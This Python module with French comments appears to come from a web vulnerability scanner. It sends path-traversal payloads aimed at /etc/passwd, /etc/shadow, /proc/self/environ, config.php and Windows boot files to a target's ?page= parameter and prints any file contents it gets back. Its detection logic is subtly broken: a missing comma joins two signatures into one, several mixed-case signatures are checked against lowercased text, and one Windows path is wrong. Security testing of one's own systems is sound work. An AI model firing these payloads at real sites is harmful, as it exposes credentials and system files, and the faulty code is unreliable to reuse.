# Détection des inclusions locales de fichiers (LFI)
import requests
import urllib3

import os
from core.report_manager import update_report

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Liste des payloads LFI à tester
LFI_PAYLOADS = [
    "../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../../../../../../../etc/hostname",
    "../../../../../../../../../../../../../../../../etc/issue",
    "../../../../../../../../../../../../../../../../etc/motd",
    "../../../../../../../../../../../../../../../../etc/group",
    "../../../../../../../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../../../../../../../../../etc/httpd/httpd.conf",
    "../../../../../../../../../../../../../../../../var/www/html/config.php",
    "../../../../../../../../../../../../../../../../proc/self/environ",
    "../../../../../../../../../../../../../../../../proc/self/cmdline",
    "../../../../../../../../../../../../../../../../boot.ini",
    "../../../../../../../../../../../../../../../../Windows/windows.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0",                                  # Indique l'accès à /etc/passwd
    "[extensions]",                                # Windows ini files
    "root:", "daemon:", "bin:", "sys:",            # Autres entrées utilisateurs
    "[boot loader]", "[operating systems]",        # Indicateurs Windows
    "ServerName", "DocumentRoot",                  # Indicateurs Apache config
    "[mysqld]", "[client]", "password=",           # Indicateurs MySQL
    "EXT3", "EXT4", "UUID=", "dev/sda",            # Fichiers de montage Linux
    "HTTP_USER_AGENT", "HTTP_COOKIE", "HTTP_HOST"  # Variables d'environnement
    
    "Warning: include(", "Warning: require(", "failed to open stream",
    "No such file or directory", "on line", "open_basedir restriction"
]


def scan_lfi(target, formated_target):
    """Teste l'inclusion de fichiers locaux (LFI)"""
    
    print(f"\n\t==============Scan LFI sur -->{formated_target}<-- 🔍 ==============\n")
    
    vuln_found = False
    findings = {}
    for payload in LFI_PAYLOADS:
        for extra in ["", "%00"]:
            url = f"{target}/?page={payload}{extra}"
            print(f"[~] Test de l'URL : {url}")
            session = requests.Session()
            session.verify = False
            try:
                # response = requests.get(url, timeout=5)
                
                response = session.get(url, timeout=5)
                response_text = response.text.lower()
                
                if any(signature in response_text for signature in LFI_SIGNATURES):
                    print(f"[!!!]🔥 LFI détectée dans l'URL : {url}")
                    # print(f"🔥 LFI détectée : {url}")
                    print(f"\t----------> {response.text[:500]}...\n")
                    vuln_found = True
                    findings[url] = "VULNERABLE"
                else:
                    findings[url] = "Non Vulnérable"
                    
            except requests.exceptions.RequestException as e:
                print(f"[!][!][XXX] Erreur lors de la requête : {e}")
            pass
    
    
    if not vuln_found:
        print("\n✅  Aucune LFI détectée.\n")
    
    return findings